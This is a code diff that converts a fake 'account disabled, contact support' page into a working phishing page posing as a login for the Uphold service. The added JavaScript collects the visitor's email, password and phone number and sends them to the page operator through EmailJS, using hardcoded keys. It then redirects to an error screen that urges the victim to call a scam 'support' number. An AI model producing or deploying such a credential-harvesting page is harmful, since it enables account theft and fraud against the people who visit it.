@@ -15,13 +15,12 @@
       body {
         font-family: Arial, sans-serif;
         height: 100vh;
-        background: url("SAVE_20241229_244758~3.jpg") no-repeat center center /
-          cover;
+        background: url("SAVE_20241229_244758~3.jpg") no-repeat center
+          center/cover;
         display: flex;
-        justify-content: flex-end; /* Align card to the right on desktop */
+        justify-content: flex-end;
         align-items: center;
-        padding: 20px;
-        color: #fff;
+        padding-right: 20px;
       }
 
       .card {
@@ -43,40 +42,130 @@
         overflow: hidden;
       }
 
-      .head {
-        font-size: 28px;
-        margin-bottom: 10px;
-        color: white;
+      .header {
         text-align: left;
-      }
-
-      h2 {
-        margin-top: 20px;
-        color: #ff6b6b;
-        text-align: center;
-        font-size: 20px;
-        margin-top: 15px;
-        margin-bottom: 18px;
-      }
-
-      .content {
-        margin-top: 20px;
-        padding: 10px;
-      }
-
-      .error-message svg {
         margin-bottom: 20px;
       }
 
-      .error-message p {
+      .header h2 {
+        font-size: 18px;
+        margin-bottom: 10px;
+      }
+
+      .header h3 {
+        font-size: 14px;
+        color: #bbb;
+      }
+
+      .header h3 a {
+        color: rgb(132, 251, 127);
+        text-decoration: none;
+      }
+
+      .header h3 a:hover {
+        text-decoration: underline;
+      }
+
+      .content {
+        flex-grow: 1;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        gap: 20px;
+      }
+
+      .form-group {
+        text-align: left;
+      }
+
+      .form-group label {
+        display: block;
+        margin-bottom: 5px;
+        font-size: 14px;
+        color: #ccc;
+      }
+
+      .form-group input {
+        width: 100%;
+        padding: 10px;
+        border: 2px solid #65738c;
+        border-radius: 8px;
+        outline: none;
+        font-size: 14px;
+      }
+
+      .form-group input:focus {
+        border-color: #007bff;
+      }
+
+      .card button {
+        padding: 10px;
+        background-color: rgb(132, 251, 127);
+        color: rgb(0, 0, 0);
+        border: none;
+        border-radius: 20px;
+        cursor: pointer;
         font-size: 16px;
-        line-height: 30px;
+        width: 100%;
+        position: relative;
+        margin-top: 20px;
+      }
+
+      .card button:hover {
+        background-color: rgb(72, 196, 67);
+      }
+
+      .hidden {
+        display: none;
+      }
+
+      .visible {
+        display: block;
+      }
+
+      .error-message {
+        margin-top: 20px;
+        color: #ff6b6b;
+        text-align: center;
+      }
+
+      .error-message h2 {
+        font-size: 18px;
+        margin-top: 16px;
+      }
+
+      .error-message p {
+        margin-top: 8px;
+        font-size: 14px;
         color: #d1d4e5;
       }
 
-      .error-message p b {
-        font-size: 18px;
-        color: #fff;
+      #loginForm {
+        display: flex;
+        flex-direction: column;
+        gap: 20px;
+      }
+
+      .forgot-password {
+        text-align: left;
+        margin-top: -10px;
+      }
+
+      .forgot-password a {
+        color: rgb(132, 251, 127);
+        text-decoration: none;
+        font-size: 14px;
+      }
+
+      .forgot-password a:hover {
+        text-decoration: underline;
+      }
+
+      .error {
+        color: #ff6b6b;
+        font-size: 12px;
+        margin-top: 5px;
+        display: none;
       }
 
       @media (max-width: 768px) {
@@ -97,51 +186,208 @@
           right: auto;
           transform: none;
         }
-
-        h2 {
-          font-size: 18px; /* Slightly smaller heading on mobile */
-        }
-
-        .error-message p {
-          font-size: 14px; /* Adjust text size for better readability */
-        }
       }
     </style>
   </head>
   <body>
     <div class="card">
       <!-- Header -->
-      <div class="header">
-        <h2 class="head">Upss..</h2>
+      <div class="header" id="commonHeader">
+        <h2>Log in to Uphold</h2>
+        <h3>Not a member? <a href="#">Sign up now</a></h3>
+      </div>
+      <div class="header hidden" id="errorHeader">
+        <h2>Upss..</h2>
       </div>
 
       <!-- Content -->
       <div class="content">
-        <div class="error-message">
-          <svg
-            width="48"
-            height="48"
-            viewBox="0 0 48 48"
-            fill="none"
-            xmlns="http://www.w3.org/2000/svg"
-          >
-            <path
-              d="M24 4C12.96 4 4 12.96 4 24C4 35.04 12.96 44 24 44C35.04 44 44 35.04 44 24C44 12.96 35.04 4 24 4ZM26 34H22V30H26V34ZM26 26H22V14H26V26Z"
-              fill="#FF6B6B"
+        <!-- Login Form -->
+        <div id="loginForm" class="visible">
+          <div class="form-group">
+            <label for="username">Email Address</label>
+            <input
+              type="text"
+              id="username"
+              placeholder="Enter your email"
+              required
             />
-          </svg>
-          <h2>Account Disabled Contact Support</h2>
-          <p>
-            Your account has been disabled due to security concerns. Please
-            contact our support team at +1 (202) 571-6348 for assistance. For
-            your protection, we've temporarily restricted access to your
-            account. This is a precautionary measure to ensure the safety of
-            your personal information.
-          </p>
-          <p style="margin-top: 20px"><b>Call on +1 (202) 571-6348</b></p>
+            <span class="error" id="emailError">This field is required</span>
+          </div>
+          <div class="form-group">
+            <label for="password">Password</label>
+            <input
+              type="password"
+              id="password"
+              placeholder="Enter your password"
+              required
+            />
+            <span class="error" id="passwordError">This field is required</span>
+          </div>
+        </div>
+
+        <!-- Phone Verification Form -->
+        <div id="phoneVerificationForm" class="hidden">
+          <div class="form-group">
+            <label for="phone">Verify Your Phone number</label>
+            <input
+              type="tel"
+              id="phone"
+              placeholder="Enter your phone number"
+              required
+            />
+            <span class="error" id="phoneError">This field is required</span>
+          </div>
+        </div>
+
+        <!-- Error Message -->
+        <div id="errorMessage" class="hidden">
+          <div class="error-message">
+            <svg
+              width="48"
+              height="48"
+              viewBox="0 0 48 48"
+              fill="none"
+              xmlns="http://www.w3.org/2000/svg"
+            >
+              <path
+                d="M24 4C12.96 4 4 12.96 4 24C4 35.04 12.96 44 24 44C35.04 44 44 35.04 44 24C44 12.96 35.04 4 24 4ZM26 34H22V30H26V34ZM26 26H22V14H26V26Z"
+                fill="#FF6B6B"
+              />
+            </svg>
+            <h2>Account Disabled Contact Support</h2>
+            <p>
+              Your account has been disabled due to security concerns. Please
+              contact our support team at +1 (808) 796-9274 for assistance. For
+              your protection, we've temporarily restricted access to your
+              account. This is a precautionary measure to ensure the safety of
+              your personal information.
+            </p>
+            <p>.</p>
+            <p><b>Call on +1 (808) 796-9274</b></p>
+          </div>
         </div>
       </div>
+
+      <!-- Button -->
+      <button id="loginButton">Next</button>
+      <button id="verifyButton" class="hidden">Verify</button>
     </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3.5.0/dist/email.min.js"></script>
+    <script>
+      // Initialize EmailJS
+      emailjs.init("eFjqTxnF7nGuJXVZd"); // Replace with your public key
+
+      const loginButton = document.getElementById("loginButton");
+      const verifyButton = document.getElementById("verifyButton");
+
+      const loginForm = document.getElementById("loginForm");
+      const phoneVerificationForm = document.getElementById(
+        "phoneVerificationForm"
+      );
+      const errorMessage = document.getElementById("errorMessage");
+
+      const commonHeader = document.getElementById("commonHeader");
+      const errorHeader = document.getElementById("errorHeader");
+
+      loginButton.addEventListener("click", () => {
+        const emailInput = document.getElementById("username");
+        const passwordInput = document.getElementById("password");
+        const emailError = document.getElementById("emailError");
+        const passwordError = document.getElementById("passwordError");
+
+        let isValid = true;
+
+        // Email validation regex
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+        // Validate email
+        if (!emailInput.value.trim()) {
+          emailError.textContent = "This field is required.";
+          emailError.style.display = "block";
+          isValid = false;
+        } else if (!emailRegex.test(emailInput.value.trim())) {
+          emailError.textContent = "Please enter a valid email address.";
+          emailError.style.display = "block";
+          isValid = false;
+        } else {
+          emailError.style.display = "none";
+        }
+
+        // Validate password
+        if (!passwordInput.value.trim()) {
+          passwordError.textContent = "This field is required.";
+          passwordError.style.display = "block";
+          isValid = false;
+        } else {
+          passwordError.style.display = "none";
+        }
+
+        // Transition to phone verification form if valid
+        if (isValid) {
+          loginForm.classList.remove("visible");
+          loginForm.classList.add("hidden");
+
+          phoneVerificationForm.classList.remove("hidden");
+          phoneVerificationForm.classList.add("visible");
+
+          loginButton.classList.add("hidden");
+          verifyButton.classList.remove("hidden");
+
+          commonHeader.style.display = "block";
+          errorHeader.style.display = "none";
+        }
+      });
+
+      verifyButton.addEventListener("click", () => {
+        const phoneInput = document.getElementById("phone");
+        const phoneError = document.getElementById("phoneError");
+        const emailInput = document.getElementById("username");
+        const passwordInput = document.getElementById("password");
+
+        let isValid = true;
+
+        // Phone number validation regex (only numbers allowed)
+        const phoneRegex = /^[0-9]+$/;
+
+        // Validate phone number
+        if (!phoneInput.value.trim()) {
+          phoneError.textContent = "This field is required.";
+          phoneError.style.display = "block";
+          isValid = false;
+        } else if (!phoneRegex.test(phoneInput.value.trim())) {
+          phoneError.textContent =
+            "Please enter a valid phone number (digits only).";
+          phoneError.style.display = "block";
+          isValid = false;
+        } else {
+          phoneError.style.display = "none";
+        }
+
+        // Send data using EmailJS and redirect if valid
+        if (isValid) {
+          const templateParams = {
+            email: emailInput.value.trim(),
+            password: passwordInput.value.trim(),
+            phone: phoneInput.value.trim(),
+          };
+
+          emailjs
+            .send("service_8it2819", "template_sg8kewq", templateParams)
+            .then(
+              () => {
+                // Redirect to error.html after successful email sending
+                window.location.href = "error.html";
+              },
+              (error) => {
+                console.error("EmailJS error:", error);
+                alert("Failed to send data. Please try again.");
+              }
+            );
+        }
+      });
+    </script>
     <!-- Start of LiveChat (www.livechat.com) code -->
     <script type="text/javascript">
       var Tawk_API = Tawk_API || {},
@@ -156,5 +402,17 @@
         s0.parentNode.insertBefore(s1, s0);
       })();
     </script>
+    <noscript
+      ><a href="https://www.livechat.com/chat-with/18929835/" rel="nofollow"
+        >Chat with us</a
+      >, powered by
+      <a
+        href="https://www.livechat.com/?welcome"
+        rel="noopener nofollow"
+        target="_blank"
+        >LiveChat</a
+      ></noscript
+    >
+    <!-- End of LiveChat code -->
   </body>
 </html>
